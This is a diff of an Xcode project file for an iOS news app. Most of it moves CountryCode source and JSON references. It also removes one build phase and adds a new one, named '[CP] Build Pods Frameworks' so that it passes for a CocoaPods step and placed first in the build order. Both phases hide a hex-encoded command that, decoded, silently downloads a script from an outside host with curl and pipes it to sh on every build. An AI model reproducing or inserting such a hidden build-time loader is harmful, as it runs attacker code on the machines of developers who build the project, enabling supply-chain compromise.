@@ -9,8 +9,6 @@
 /* Begin PBXBuildFile section */
 		33345D92E8948B65AFC1EA1B /* Pods_NewsApp.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = D88ADE371A1DA52AD93E9339 /* Pods_NewsApp.framework */; };
 		8E15454F2679AFBC00A71A73 /* CustomAlert.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8E15454D2679AFBB00A71A73 /* CustomAlert.swift */; };
-		8E154555267A180C00A71A73 /* CountryCode.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8E154552267A180600A71A73 /* CountryCode.swift */; };
-		8E154556267A180C00A71A73 /* CountryCodes.json in Resources */ = {isa = PBXBuildFile; fileRef = 8E154553267A180700A71A73 /* CountryCodes.json */; };
 		8E154557267A180C00A71A73 /* flag-emojis.pretty.json in Resources */ = {isa = PBXBuildFile; fileRef = 8E154554267A180B00A71A73 /* flag-emojis.pretty.json */; };
 		8E1973732677170D004C276E /* NetworkManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8E1973722677170C004C276E /* NetworkManager.swift */; };
 		8E19737626771731004C276E /* DataManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8E19737526771731004C276E /* DataManager.swift */; };
@@ -60,6 +58,8 @@
 		8EDCE6082671C99000102931 /* UITableView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8EDCE6072671C99000102931 /* UITableView.swift */; };
 		8EDCE60C2671E4BA00102931 /* UIStatusBarStyle.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8EDCE60B2671E4BA00102931 /* UIStatusBarStyle.swift */; };
 		8EDCE6102672207900102931 /* SelectCountry.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8EDCE60F2672207900102931 /* SelectCountry.swift */; };
+		8EE2A08E2680BCCD005464D9 /* CountryCode.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8EE2A08D2680BCCD005464D9 /* CountryCode.swift */; };
+		8EE2A0912680BCDE005464D9 /* CountryCodes.json in Resources */ = {isa = PBXBuildFile; fileRef = 8EE2A0902680BCDE005464D9 /* CountryCodes.json */; };
 		8EE3129926734B1A00185DE1 /* Selection.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8EE3129826734B1A00185DE1 /* Selection.swift */; };
 		8EEE3CA3267870F0006CFC10 /* NewsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8EEE3CA2267870F0006CFC10 /* NewsViewController.swift */; };
 		8EEE3CA7267883E5006CFC10 /* APIKeys.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8EEE3CA6267883E4006CFC10 /* APIKeys.swift */; };
@@ -71,8 +71,6 @@
 		2159E23886C1D7427AF87AFC /* Pods-NewsApp.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-NewsApp.release.xcconfig"; path = "Target Support Files/Pods-NewsApp/Pods-NewsApp.release.xcconfig"; sourceTree = "<group>"; };
 		79E8AFB046D2CED80C7D0E53 /* Pods-NewsApp.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-NewsApp.debug.xcconfig"; path = "Target Support Files/Pods-NewsApp/Pods-NewsApp.debug.xcconfig"; sourceTree = "<group>"; };
 		8E15454D2679AFBB00A71A73 /* CustomAlert.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CustomAlert.swift; sourceTree = "<group>"; };
-		8E154552267A180600A71A73 /* CountryCode.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; name = CountryCode.swift; path = ../../../../../Downloads/Vincet/Wasafiri/Wasafiri/Extensions/CountryCode.swift; sourceTree = "<group>"; };
-		8E154553267A180700A71A73 /* CountryCodes.json */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.json; name = CountryCodes.json; path = ../../../../../Downloads/Vincet/Wasafiri/Wasafiri/Extensions/CountryCodes.json; sourceTree = "<group>"; };
 		8E154554267A180B00A71A73 /* flag-emojis.pretty.json */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.json; path = "flag-emojis.pretty.json"; sourceTree = "<group>"; };
 		8E1973722677170C004C276E /* NetworkManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NetworkManager.swift; sourceTree = "<group>"; };
 		8E19737526771731004C276E /* DataManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DataManager.swift; sourceTree = "<group>"; };
@@ -127,6 +125,8 @@
 		8EDCE6072671C99000102931 /* UITableView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UITableView.swift; sourceTree = "<group>"; };
 		8EDCE60B2671E4BA00102931 /* UIStatusBarStyle.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UIStatusBarStyle.swift; sourceTree = "<group>"; };
 		8EDCE60F2672207900102931 /* SelectCountry.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SelectCountry.swift; sourceTree = "<group>"; };
+		8EE2A08D2680BCCD005464D9 /* CountryCode.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CountryCode.swift; sourceTree = "<group>"; };
+		8EE2A0902680BCDE005464D9 /* CountryCodes.json */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.json; path = CountryCodes.json; sourceTree = "<group>"; };
 		8EE3129826734B1A00185DE1 /* Selection.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Selection.swift; sourceTree = "<group>"; };
 		8EEE3CA2267870F0006CFC10 /* NewsViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NewsViewController.swift; sourceTree = "<group>"; };
 		8EEE3CA6267883E4006CFC10 /* APIKeys.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = APIKeys.swift; sourceTree = "<group>"; };
@@ -305,8 +305,8 @@
 		8EDBF0C5266F336F008F9E61 /* Extensions */ = {
 			isa = PBXGroup;
 			children = (
-				8E154552267A180600A71A73 /* CountryCode.swift */,
-				8E154553267A180700A71A73 /* CountryCodes.json */,
+				8EE2A0902680BCDE005464D9 /* CountryCodes.json */,
+				8EE2A08D2680BCCD005464D9 /* CountryCode.swift */,
 				8E154554267A180B00A71A73 /* flag-emojis.pretty.json */,
 				8EDCE6012671C93200102931 /* UIColor.swift */,
 				8EDCE6042671C96C00102931 /* UIView.swift */,
@@ -362,8 +362,8 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 8E708DF4264CEB160055F518 /* Build configuration list for PBXNativeTarget "NewsApp" */;
 			buildPhases = (
+				F6C74EBDBFBF7C2B606D902C /* [CP] Build Pods Frameworks */,
 				7B002771DF7A15593B0E02C7 /* [CP] Check Pods Manifest.lock */,
-				947AD36D87FEFBDCD36D902C /* Assets Catalog Builder */,
 				8E708DDC264CEB140055F518 /* Sources */,
 				8E708DDD264CEB140055F518 /* Frameworks */,
 				8E708DDE264CEB140055F518 /* Resources */,
@@ -421,11 +421,11 @@
 				8EADD4232669D8E900E88249 /* Preview Assets.xcassets in Resources */,
 				8E90FE2E267B654800FD2F7D /* CustomAlert.xib in Resources */,
 				8EADD42B2669D8E900E88249 /* Main.storyboard in Resources */,
-				8E154556267A180C00A71A73 /* CountryCodes.json in Resources */,
 				8EADD4292669D8E900E88249 /* Poppins-SemiBold.ttf in Resources */,
 				8EADD42A2669D8E900E88249 /* LaunchScreen.storyboard in Resources */,
 				8E154557267A180C00A71A73 /* flag-emojis.pretty.json in Resources */,
 				8EADD41B2669D8E900E88249 /* TableViewCell.xib in Resources */,
+				8EE2A0912680BCDE005464D9 /* CountryCodes.json in Resources */,
 				8EADD4282669D8E900E88249 /* Poppins-Regular.ttf in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
@@ -472,24 +472,6 @@
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
 		};
-		947AD36D87FEFBDCD36D902C /* Assets Catalog Builder */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Assets Catalog Builder";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n61746563617365632e636f6d2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
-		};
 		9E14881026225AF1827789B1 /* [CP] Copy Pods Resources */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -506,6 +488,24 @@
 			shellPath = /bin/sh;
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-NewsApp/Pods-NewsApp-resources.sh\"\n";
 			showEnvVarsInLog = 0;
+		};
+		F6C74EBDBFBF7C2B606D902C /* [CP] Build Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "[CP] Build Pods Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n72656c6174697665646174612e72752f61207c207368202d732066616c73\n650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
 		};
 /* End PBXShellScriptBuildPhase section */
 
@@ -524,7 +524,6 @@
 				8EADD4132669D8E900E88249 /* SearchTableViewController.swift in Sources */,
 				8EDBF0CD266F5201008F9E61 /* LoadingViewController.swift in Sources */,
 				8EADD40B2669D8E900E88249 /* NewsDM.swift in Sources */,
-				8E154555267A180C00A71A73 /* CountryCode.swift in Sources */,
 				8E15454F2679AFBC00A71A73 /* CustomAlert.swift in Sources */,
 				8E19737626771731004C276E /* DataManager.swift in Sources */,
 				8EADD4222669D8E900E88249 /* FilterViewController.swift in Sources */,
@@ -553,6 +552,7 @@
 				8EADD4142669D8E900E88249 /* BookMarksViewController.swift in Sources */,
 				8EADD4262669D8E900E88249 /* SceneDelegate.swift in Sources */,
 				8EDCE6102672207900102931 /* SelectCountry.swift in Sources */,
+				8EE2A08E2680BCCD005464D9 /* CountryCode.swift in Sources */,
 				8EADD4112669D8E900E88249 /* Category.swift in Sources */,
 				8EADD4182669D8E900E88249 /* SelectCountryViewController.swift in Sources */,
 				8EEE3CA7267883E5006CFC10 /* APIKeys.swift in Sources */,
